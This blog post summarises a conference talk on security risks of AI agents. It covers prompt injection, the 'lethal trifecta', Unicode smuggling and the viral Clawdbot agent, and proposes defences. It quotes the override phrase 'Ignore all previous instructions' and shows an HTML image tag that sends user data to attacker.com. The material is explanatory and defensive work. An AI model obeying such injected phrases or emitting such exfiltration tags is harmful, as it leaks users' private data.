---
title: "Danger In Dialogue: Why AI Agents Are Your Newest Attack Surface"
author: "Scott Bell"
description: "A summary of agentic AI security risks from my SQLBits 2025 talk, with a timely example from the Clawdbot/Moltbot phenomenon."
date: "2026-01-27"
draft: false
categories:
  - ai
  - agents
  - security
  - agentic
---

::: {.callout-note appearance="simple"}
This post was developed with the help of AI based on my research. See my post on [AI Content Labels](../AI-Content-Labels/index.qmd).
:::

Last year I presented "Danger In Dialogue: The Security Risks of Large Language Models" at SQLBits 2025. The talk covers a security paradigm shift that most teams aren't prepared nearly enough for now that natural language becomes an attack vector.

![My talk at SQLBITS 2025](images/sqlbits-2025.jpeg)

::: {.callout-tip appearance="simple" collapse="true"}
## Presentation: Danger In Dialogue: The Security Risks of Large Language Models

**Video Coming Soon**

```{=html}
<div style="display: flex; justify-content: center; align-items: center; width: 100%;">
<iframe src="https://fusionet24.github.io/Talks/sql-bits-danger-in-diaglogue.html" 
        style="width: 100%; height: 500px; border: none; max-width: 800px;"></iframe>
</div>
```
:::

I've been meaning to write this post since that talk and it just kept getting delayed or put off.


Then [Clawdbot went viral this weekend](https://dev.to/sivarampg/from-clawdbot-to-moltbot-how-a-cd-crypto-scammers-and-10-seconds-of-chaos-took-down-the-4eck) with 60,000+ GitHub stars, root access to your machine, connected to all your messaging apps and my theoretical slides became a live demonstration.

## The New Threat Model

Traditional security thinking focuses on process, architecture or code vulnerabilities. Things like SQL injection, XSS, buffer overflows. We've built decades of tooling and thinking around the assumption that attacks come through code.

LLMs break this model. The attack surface is now all of natural language, not just languages but symbols, lack of symbols and even hidden characters.That can be hidden every document (hello sharepoint!), database record, or API response that your agent processes. **The Dialogue itself is the vulnerability.**

## The OWASP Top 10 for LLM Applications

The 2025 OWASP list identifies the critical threats facing Large Language Models. The ones I see most often in practice:

**Prompt Injection** remains the top threat. Attackers override system instructions through crafted inputs—either directly ("Ignore all previous instructions...") or indirectly through data the LLM processes later.

**Excessive Agency** is where agents get dangerous. We're giving models permissions they don't need and exposure they can't handle. Every capability is also an attack surface.

**Sensitive Information Disclosure** happens when models reveal data they shouldn't. This includes system prompt leakage, which exposes your entire security posture.

## The Lethal Trifecta

[Simon Willison coined the Lethal Trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)where AI agents become critically vulnerable when they combine three capabilities:

1.  **Access to private data** (files, emails, databases)
2.  **Exposure to untrusted content** (web pages, messages, external documents)
3.  **External communication ability** (API calls, git push, sending messages)

A lot of agents have all three. Clawdbot has all three by design, it's meant to be a capable assistant afterall. That's exactly what makes it risky.

## Attack Patterns

### Indirect Prompt Injection

Attackers embed malicious instructions in content the LLM processes. A sharepoint document, a word document, a GitHub issue. A log file. A code comment. The agent reads it, follows the instructions, and you never approved anything.

![A prompt injection attack targeting an AI agent's X scraper](images/prompt-injection-example.jpeg)

This tweet demonstrates the pattern. Someone posts instructions disguised as a user message. If your agent scrapes X for context, it might just follow them.

We've seen a really good example recently on [github copilot](https://embracethered.com/blog/posts/2025/github-copilot-remote-code-execution-via-prompt-injection/)

### Data Exfiltration via HTML

Attackers embed instructions that force LLMs to format sensitive data as HTML image tags calling external servers:

``` html
<img src="http://attacker.com/leak?name=Scott&data=Salary100MillionDollars">
```

The browser renders it. The data exfiltrates. The user sees nothing.

### Unicode Smuggling

Unicode tag characters are invisible to human reviewers but processed by AI models. A GitHub issue looks clean. The agent reads hidden instructions and downloads malware.

### The AI Killchain

Successful attacks follow a consistent pattern:

**Prompt Injection** → **Confused Deputy** → **Automatic Tool Invocation**

Johann Rehberger has documented this against Claude Code, GitHub Copilot, Amazon Q, and Gemini. The pattern is reliable. The defenses aren't.

## A Timely Example

![Peter Steinberger on maintaining Clawdbot](images/peter-steinberger-tweet.png)

Clawdbot (now Moltbot after Anthropic's C&D) hit 60,000+ GitHub stars. One developer. A hobby project. Security researchers demanding bug bounties.

This isn't a critique of Peter Steinberger—he's been transparent about the sharp edges. The issue is that tens of thousands of developers installed it anyway. On machines with production credentials. Connected to work Slack.

This is the normalization of deviance. We're accepting that AI tools might wipe our drives or leak our data as "normal."

It's not normal.

## Defense Framework

From my talk, the defense approach has three pillars:

### Pillar 1: Isolate & Constrain

Never give agents all three lethal capabilities simultaneously. Separate responsibilities. Apply least privilege. If the agent doesn't need terminal access, don't give it terminal access.

### Pillar 2: Sanitize Everything

Filter inputs for hidden threats like Unicode smuggling. Validate all LLM outputs before sending them to browsers, databases, or APIs. Treat model output like untrusted user input—because it is.

### Pillar 3: Monitor & Verify

Log everything: prompts, responses, tool calls. Require human approval for critical actions. Design approval workflows that avoid alert fatigue—a denial-of-service attack on human cognition is still an attack.

## What I Actually Do

I still use AI agents. But I treat them like untrusted code:

-   Dedicated VMs for agent work
-   No production credentials in agent environments
-   Human review before any git push
-   Monitoring and logging of all agent actions

Is it slower? Sometimes. But the average breach costs \$4.88 million (IBM 2024). The productivity gain from running unsandboxed agents isn't worth that.

## The Bottom Line

Capability without containment is just liability.

The AI agent ecosystem is growing fast. The security tooling hasn't caught up. And right now, the gap between what these tools can do and what we can secure is widening.

Don't normalize the risk. Assume breach. Build defenses downstream of the LLM.

------------------------------------------------------------------------

*For the visual version, see my carousel on [AI Agent Security](/s/agentic-security-fun). For the full talk, see my SQLBits 2025 presentation "Danger In Dialogue" embedded [here](../sql-bits-2025/index.qmd).*

Sources:

-   [OWASP Top 10 for LLM Applications 2025](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
-   [Johann Rehberger's Agent Security Research](https://embracethered.com/)
-   [From Clawdbot to Moltbot - DEV Community](https://dev.to/sivarampg/from-clawdbot-to-moltbot-how-a-cd-crypto-scammers-and-10-seconds-of-chaos-took-down-the-4eck)
-   [Simon Willison on Prompt Injection](https://simonwillison.net/)